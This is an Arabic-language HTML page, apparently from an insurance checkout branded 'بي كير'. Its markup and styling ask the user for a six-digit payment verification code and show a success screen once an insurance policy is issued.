<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>بي كير | تأكيد الدفع</title>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;400;500;600;700;800&family=Readex+Pro:wght@200;300;400;500;600;700&display=swap" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet"/>
  <link rel="stylesheet" href="css/style.css"/>
  <link rel="stylesheet" href="css/offers.css"/>
  <style>
/* ══ OTP Page Styles ══ */
.otp-wrap {
  max-width: 400px; margin-inline: auto;
  padding-inline: clamp(.75rem,4vw,1rem);
  padding-top: clamp(1rem,4vw,2rem);
}

/* أيقونة الهاتف */
.otp-icon-box {
  width: 68px; height: 68px; border-radius: 50%;
  background: linear-gradient(135deg,rgba(20,99,148,.12),rgba(20,99,148,.06));
  border: 2px solid rgba(20,99,148,.15);
  display: flex; align-items: center; justify-content: center;
  margin: 0 auto 1rem;
}
.otp-icon-box .material-icons { font-size: 2rem; color: var(--blue); }

.otp-title { font-size: 1.15rem; font-weight: 800; color: var(--gray-800); text-align: center; margin-bottom: .35rem; }
.otp-sub   { font-size: .84rem; color: var(--gray-500); text-align: center; line-height: 1.65; margin-bottom: 1.5rem; }

/* ملخص مدفوع */
.otp-amount-badge {
  background: linear-gradient(135deg,var(--blue),var(--blue-light));
  color: var(--white); border-radius: 12px;
  padding: .875rem 1.25rem; text-align: center; margin-bottom: 1.5rem;
}
.otp-amount-label { font-size: .78rem; opacity: .75; margin-bottom: .25rem; }
.otp-amount-val   { font-size: 1.5rem; font-weight: 800; letter-spacing: .02em; }
.otp-amount-co    { font-size: .8rem; opacity: .8; margin-top: .2rem; }

/* مربعات OTP */
.otp-boxes {
  display: flex; justify-content: center; gap: .5rem;
  margin-bottom: .75rem; direction: ltr;
}
.otp-box {
  width: 48px; height: 58px;
  border: 2px solid var(--border);
  border-radius: 10px; background: var(--white);
  font-size: 1.4rem; font-weight: 800;
  color: var(--blue); text-align: center;
  outline: none; transition: border-color .15s, box-shadow .15s;
  caret-color: var(--blue);
  font-family: 'Courier New', monospace;
}
.otp-box:focus        { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(20,99,148,.12); }
.otp-box.filled       { border-color: var(--blue); background: rgba(20,99,148,.04); }
.otp-box.otp-error    { border-color: var(--red); background: var(--red-bg); animation: shake .35s ease; }
.otp-box.otp-success  { border-color: #22c55e; background: rgba(34,197,94,.05); }

@keyframes shake {
  0%,100%{ transform:translateX(0) }
  20%    { transform:translateX(-5px) }
  60%    { transform:translateX(5px) }
}

/* رسالة الخطأ */
.otp-err {
  text-align: center; font-size: .8rem; font-weight: 600;
  color: var(--red); min-height: 1rem; margin-bottom: .5rem;
  transition: opacity .2s;
}

/* مؤقت */
.otp-timer-wrap { text-align: center; margin-bottom: 1.25rem; }
.otp-timer {
  display: inline-flex; align-items: center; gap: .35rem;
  font-size: .82rem; color: var(--gray-500);
}
.otp-timer-count {
  font-size: .95rem; font-weight: 800; color: var(--blue);
  min-width: 28px; text-align: center;
  transition: color .3s;
}
.otp-timer-count.urgent { color: var(--red); }
.otp-timer .material-icons { font-size: 1rem; }

/* إعادة إرسال */
.otp-resend {
  background: none; border: none; cursor: pointer;
  font-family: var(--font); font-size: .82rem; font-weight: 600;
  color: var(--blue); text-decoration: underline;
  padding: .25rem; transition: var(--trans);
}
.otp-resend:hover { color: var(--blue-dark); }
.otp-resend:disabled { color: var(--gray-400); text-decoration: none; cursor: default; }

/* زر التأكيد */
.otp-confirm-btn {
  width: 100%; padding: .9rem 1rem;
  background: linear-gradient(135deg,var(--blue),var(--blue-light));
  color: var(--white); font-size: .95rem; font-weight: 800;
  border-radius: 12px; border: none; cursor: pointer;
  font-family: var(--font); transition: var(--trans);
  display: flex; align-items: center; justify-content: center; gap: .5rem;
  box-shadow: 0 4px 16px rgba(20,99,148,.3);
  margin-bottom: .6rem;
}
.otp-confirm-btn:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(20,99,148,.4); }
.otp-confirm-btn:disabled { background: var(--gray-200); color: var(--gray-400); cursor: not-allowed; box-shadow: none; }

.otp-back-btn {
  width: 100%; padding: .8rem 1rem;
  background: var(--white); color: var(--gray-600);
  font-size: .9rem; font-weight: 600;
  border-radius: 12px; border: 1.5px solid var(--border);
  cursor: pointer; font-family: var(--font); transition: var(--trans);
}
.otp-back-btn:hover { background: var(--gray-100); border-color: var(--blue); color: var(--blue); }

/* حالة الانتظار */
.otp-waiting-msg {
  display: flex; align-items: center; gap: .5rem;
  font-size: .78rem; color: var(--gray-400);
  text-align: center; justify-content: center;
  margin-top: .75rem;
}
.otp-waiting-msg .material-icons { font-size: .95rem; color: var(--gold); }

/* شاشة النجاح */
.otp-success-screen {
  text-align: center;
  padding: 2rem 1rem;
  display: flex; flex-direction: column; align-items: center; gap: 1rem;
}
.otp-success-icon {
  width: 80px; height: 80px;
  background: linear-gradient(135deg,#22c55e,#16a34a);
  border-radius: 50%;
  display: flex; align-items: center; justify-content: center;
  box-shadow: 0 8px 24px rgba(34,197,94,.35);
  animation: successPop .4s ease;
}
@keyframes successPop { from{transform:scale(0)}to{transform:scale(1)} }
.otp-success-icon .material-icons { font-size: 2.2rem; color: #fff; }
.otp-success-title { font-size: 1.3rem; font-weight: 800; color: var(--gray-800); }
.otp-success-sub   { font-size: .88rem; color: var(--gray-500); line-height: 1.65; }
.otp-ref-box {
  background: var(--gray-50); border-radius: 10px;
  padding: .75rem 1.5rem; width: 100%;
}
.otp-ref-lbl { font-size: .72rem; color: var(--gray-400); margin-bottom: .2rem; }
.otp-ref-val { font-size: 1rem; font-weight: 800; color: var(--blue); }

@keyframes spin-otp { from{transform:rotate(0)}to{transform:rotate(360deg)} }
.spin-otp { animation: spin-otp .8s linear infinite; display:inline-block; }
  </style>
</head>
<body class="offers-page">

<div id="app-header" data-variant="inquiry"></div>

<main class="off-main">
  <div class="otp-wrap">

    <!-- شاشة النجاح (مخفية) -->
    <div class="off-card hidden" id="otp-success-card">
      <div class="off-card-body">
        <div class="otp-success-screen">
          <div class="otp-success-icon"><span class="material-icons">check</span></div>
          <h2 class="otp-success-title">تم الدفع بنجاح!</h2>
          <p class="otp-success-sub">تهانينا! تم التحقق من الدفع وإصدار وثيقة التأمين.<br/>ستصلك الوثيقة على بريدك الإلكتروني قريباً.</p>
          <div class="otp-ref-box">
            <div class="otp-ref-lbl">رقم العملية</div>
            <div class="otp-ref-val" id="success-ref">—</div>
          </div>
          <div class="otp-ref-box" style="margin-top:.5rem">
            <div class="otp-ref-lbl">الشركة</div>
            <div class="otp-ref-val" id="success-company">—</div>
          </div>
          <div class="otp-ref-box" style="margin-top:.5rem">
            <div class="otp-ref-lbl">المبلغ المدفوع</div>
            <div class="otp-ref-val" id="success-amount">—</div>
          </div>
          <button type="button" class="off-btn-blue" style="width:100%" onclick="window.location.href='index.html'">
            <span class="material-icons" style="font-size:1rem">home</span>
            العودة للرئيسية
          </button>
        </div>
      </div>
    </div>

    <!-- نموذج OTP -->
    <div id="otp-card" class="off-card">
      <div class="off-card-body">

        <!-- أيقونة -->
        <div class="otp-icon-box">
          <span class="material-icons">verified_user</span>
        </div>

        <h1 class="otp-title">تأكيد عملية الدفع</h1>
        <p class="otp-sub" id="otp-sub-text">
          أدخل رمز التحقق المؤلف من 6 أرقام لتأكيد العملية
        </p>

        <!-- مبلغ الدفع -->
        <div class="otp-amount-badge">
          <div class="otp-amount-label">المبلغ المطلوب دفعه</div>
          <div class="otp-amount-val" id="otp-amount">—</div>
          <div class="otp-amount-co" id="otp-company">—</div>
        </div>

        <!-- مربعات OTP -->
        <div class="otp-boxes" id="otp-boxes">
          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" data-idx="0"/>
          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" data-idx="1"/>
          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" data-idx="2"/>
          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" data-idx="3"/>
          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" data-idx="4"/>
          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" data-idx="5"/>
        </div>

        <!-- رسالة الخطأ -->
        <div class="otp-err" id="otp-err"></div>

        <!-- أزرار -->
        <button type="button" class="otp-confirm-btn" id="otp-confirm-btn" disabled>
          <span class="material-icons">check_circle</span>
          تأكيد
        </button>

        <button type="button" class="otp-back-btn" onclick="window.location.href='secure-checkout.html'">
          رجوع
        </button>

      </div>
    </div>

  </div>
</main>

<div id="app-footer"></div>
<script src="js/layout.js"></script>
<script src="js/otp-verify.js"></script>
</body>
</html>
